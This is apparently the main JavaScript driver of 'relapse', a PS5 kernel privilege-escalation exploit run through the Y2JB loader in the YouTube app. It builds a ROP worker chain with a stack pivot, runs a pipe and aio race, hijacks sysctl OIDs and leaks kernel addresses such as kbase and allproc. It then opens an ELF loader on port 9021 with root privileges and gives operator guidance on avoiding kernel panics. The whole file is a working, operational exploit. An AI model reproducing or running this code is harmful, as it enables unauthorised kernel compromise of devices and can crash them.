        let failcheck_path = null;
        try {
            const present = marker_paths.filter((m) => {
                try { return file_exists(m); } catch (_) { return false; }
            });
            if (present.length && IGNORE_FAIL_MARKER) {
                log_now("fail marker present (" + present[0] +
                    ") but IGNORE_FAIL_MARKER is set - continuing anyway");
            } else if (present.length) {
                send_notification("relapse already ran this boot\nreboot the PS5 first");
                say("fail marker present (" + present[0] + ") - reboot before retrying");
                return;
            }
        } catch (_) { }

        const chain = new Y2Chain(p);

        // Prove the whole worker-chain mechanism (thr_new, the `pop rsp`
        // pivot, syscall_wrapper, the return store, the completion flag,
        // thr_exit) before anything touches the kernel.
        await probe_worker_chain(chain);

        // Relapse pins the thread that runs the race; here that is the chain
        // worker, so mirror the pin into every raw chain.
        const exploit = new KernelExploit(p, chain, say, off);
        const upstreamPin = exploit.pinToSingleCore.bind(exploit);
        exploit.pinToSingleCore = async function () {
            await upstreamPin();
            if (this.pinnedCore === undefined || this.pinnedCore < 0) return;
            let core = this.pinnedCore;
            if (WORKER_CORE === "other") {
                const mask = (this.allowedMask >>> 0) || 0;
                for (let c = 0; c < 16; c++)
                    if ((mask & (1 << c)) && c !== this.pinnedCore) { core = c; break; }
            }
            if (WORKER_CORE === null) {
                say("main thread pinned to core " + this.pinnedCore +
                    ", race worker left floating");
                return;
            }
            chain.setWorkerAffinity(core, 2 /* PRI_REALTIME */);
            say("race pinned: main core " + this.pinnedCore + ", worker core " + core);
        };

        for (const m of marker_paths) {
            try {
                write_file(m, "");
                if (file_exists(m)) { failcheck_path = m; break; }
            } catch (_) { }
        }
        if (!failcheck_path) say("could not write a one-run-per-boot marker (" +
            marker_paths.join(", ") + ") - continuing without that safety net");

        let result = null;
        let threw = null;
        if (STOP_AFTER === "chain") {
            say("STOP_AFTER=chain - the worker chain ran its self-test and nothing " +
                "else; the exploit never started and no kernel state was touched");
        } else try {
            result = await exploit.run();
        } catch (e) {
            threw = e;
        }

        if (CLOSE_PIPES_AFTER_RUN) {
            say("closing the 4 pipe fds now - if the console dies here, freeing an " +
                "armed pipe buffer is what kills it");
            // Through the chain, not the framework's syscall(): that one takes
            // BigInt arguments and patches V8 bytecode per call, so passing it a
            // Number fd throws (an earlier revision silently closed 0/4).
            const targets = [];
            for (const [name, pp] of [["master", exploit.master], ["victim", exploit.victim]])
                if (pp) targets.push([name + ".r", pp.readFd], [name + ".w", pp.writeFd]);
            const results = [];
            for (const [name, fd] of targets) {
                // One line per close, flushed before the next one: the victim
                // pipe is the armed one, so if a close is fatal we want to know
                // which.
                say("close(" + name + " fd " + fd + ") ...");
                let rv;
                try { rv = await exploit.sysInt(SYS_CLOSE, fd); }
                catch (e) { rv = "threw " + ((e && e.message) || e); }
                results.push(name + " " + fd + " -> " + rv);
                say("close(" + name + " fd " + fd + ") -> " + rv);
            }
            say("close() summary: " + results.join(" | ") + "  (0 = closed)");
        }

        // run() resolves with { done, payloads }. payloads=false means the
        // exploit stopped cleanly (rescue() restored the sysctl OIDs, the
        // pipes and the armed aio groups) - a retry is allowed, so drop the
        // marker. An exception means we cannot vouch for kernel state.
        if (!result || !result.payloads) {
            if (!threw && failcheck_path) {
                try {
                    syscall(SYSCALL.unlink, alloc_string(failcheck_path));
                    say("fail marker cleared - safe to retry");
                } catch (_) { }
            }
            if (threw) {
                say("exception: " + (threw.message || threw));
                send_notification("relapse FAILED\n" + (threw.message || threw));
            } else {
                send_notification("relapse stopped\n(see log)");
            }
            return;
        }

        // Leave the run's state readable from a later payload: the Y2JB loader
        // evals every payload in the same global scope.
        //
        // This used to install relapse_seal_pipes() too, and the log told the
        // operator to send tools/seal.js before closing the app. Both are gone.
        // That hook tore the pipes down by zeroing their buffers, which is one of
        // the two measured causes of the close panic - Build U panicked with the
        // buffers zeroed and Build V survived with the real ones written back,
        // everything else equal. Following the payload's own advice could
        // therefore cause the crash it claimed to prevent, and with
        // LEAVE_PIPES_ARMED it was a no-op at best. The seal is pipeclean.elf,
        // which writes the real buffers back; see docs/close-panic-investigation.md.
        try {
            globalThis.relapse_status = function () {
                return {
                    kbase: exploit.kbase ? exploit.kbase.toString() : null,
                    crossed: !!exploit.crossed,
                    disarmed: !!exploit.disarmed,
                    oidsRestored: !!exploit.oidsRestored,
                    handedOff: !!exploit.handedOff,
                    master: exploit.master ? [exploit.master.readFd, exploit.master.writeFd] : null,
                    victim: exploit.victim ? [exploit.victim.readFd, exploit.victim.writeFd] : null,
                };
            };
        } catch (e) {
            log_now("could not install the status hook: " + e.message);
        }

        if (PIPE_NOTE_FOR_CLEANER && exploit.master && exploit.victim) {
            try {
                const pp = exploit.off.pipe;
                const hex = (v) => "0x" + (v === undefined ? "e8" : v.toString(16));
                // pipeclean.elf UDPs its log here, to the same listener that
                // catches this payload's: its stdout does not survive being
                // loaded by elfldr, and the retail kernel log is encrypted.
                const logip = net_log_target ? net_log_target.split(":")[0] : "";
                const note = "logip=" + logip + "\n" +
                    "pid=" + Number(syscall(SYSCALL.getpid)) + "\n" +
                    "master=0x" + exploit.master.pipe.toString() + "\n" +
                    "victim=0x" + exploit.victim.pipe.toString() + "\n" +
                    "reference=0x" + (exploit.refPipe ? exploit.refPipe.toString() : "0") + "\n" +
                    "kbase=0x" + (exploit.kbase ? exploit.kbase.toString() : "0") + "\n" +
                    "allproc=0x" + exploit.kaddr(exploit.off.allproc).toString() + "\n" +
                    "master_buf=0x" + (exploit.savedBuffers && exploit.savedBuffers.master ? exploit.savedBuffers.master.toString() : "0") + "\n" +
                    "victim_buf=0x" + (exploit.savedBuffers && exploit.savedBuffers.victim ? exploit.savedBuffers.victim.toString() : "0") + "\n" +
                    "pipe_size=" + (exploit.savedBuffers ? exploit.savedBuffers.masterSize : 0) + "\n" +
                    "off_buffer=" + hex(pp.buffer) + "\n" +
                    "off_count=" + hex(pp.count) + "\n" +
                    "off_in=" + hex(pp.in) + "\n" +
                    "off_out=" + hex(pp.out) + "\n" +
                    "off_size=" + hex(pp.size) + "\n" +
                    "off_pair=" + hex(pp.pair) + "\n";
                const dirs = ["/user/temp/common_temp"];
                try { dirs.unshift("/" + get_nidpath() + "/common_temp"); } catch (_) { }
                let wrote = 0;
                for (const d of dirs) {
                    try {
                        write_file(d + "/relapse-pipes.txt", note);
                        wrote++;
                        say("pipe note written to " + d + "/relapse-pipes.txt");
                    } catch (e) {
                        say("pipe note not written to " + d + ": " + e.message);
                    }
                }
                if (wrote) say("pipe note: " + note.replace(/\n/g, " ") +
                    "  <- send pipeclean.elf to :9021 to seal the pipes, then close the app");
                else say("PIPE_NOTE_FOR_CLEANER: no writable directory for the note");
            } catch (e) {
                say("pipe note failed: " + e.message);
            }
        }

        // Runs here rather than at startup: an unprivileged YouTube gets
        // "not readable" for every one of these directories, so the scan is
        // only worth doing once escalation has given the process uid 0 and the
        // root filesystem.
        if (CRASH_ARTIFACT_SCAN) {
            try { scan_crash_artifacts(); }
            catch (e) { say("crash-artifact scan threw " + e.message); }
        }

        // Both of these used to go through the framework's log(), which queues
        // behind a rAF and only then reaches the socket - so they were exactly the
        // lines missing from transcripts where the console died, and they are the
        // two an operator needs most. log_now() calls log() for the screen too.
        //
        // The state line is derived, not asserted: it used to claim the pipes and
        // OIDs were torn down regardless of which configuration ran, and it is the
        // last thing read before deciding whether closing the app is safe.
        log_now("=== relapse complete ===");
        log_now("elfldr listening on :9021" + (exploit.crossed
            ? " - the crossed pair is STILL ARMED: send the pipeclean seal ELF to " +
            ":9021 BEFORE closing the app, closing while armed panics the console"
            : " - both pipes hold their own buffers again, the app is safe to close" +
            (exploit.oidsRestored ? "" :
                "; the sysctl OIDs are still hijacked, so kern.smp.cpus reads a " +
                "kernel address instead of the CPU count until the next reboot") +
            " (eboot segments restored)"));
        send_notification("relapse complete\nelfldr on <ps5-ip>:9021");

        if (EXIT_TEST === "sigkill" || EXIT_TEST === "exit") {
            const pid = syscall(SYSCALL.getpid);
            say("EXIT_TEST=" + EXIT_TEST + ": ending this process (pid " + pid +
                ") in 2s - if the console survives, the panic belongs to the " +
                "graceful close path and not to the aio residue");
            await sleep(2000);
            if (EXIT_TEST === "sigkill") syscall(SYSCALL.kill, pid, 9n);
            else syscall(1n /* SYS_exit */, 0n);
            say("EXIT_TEST: the process is still here - the exit call returned " +
                "(kill " + EXIT_TEST + " did not take effect)");
        }

    } catch (e) {
        try { log_now("FATAL: " + e.message); } catch (_) { }
        try { send_notification("relapse FAILED: " + e.message); } catch (_) { }
    } finally {
        restore_log_socket();
    }
})();
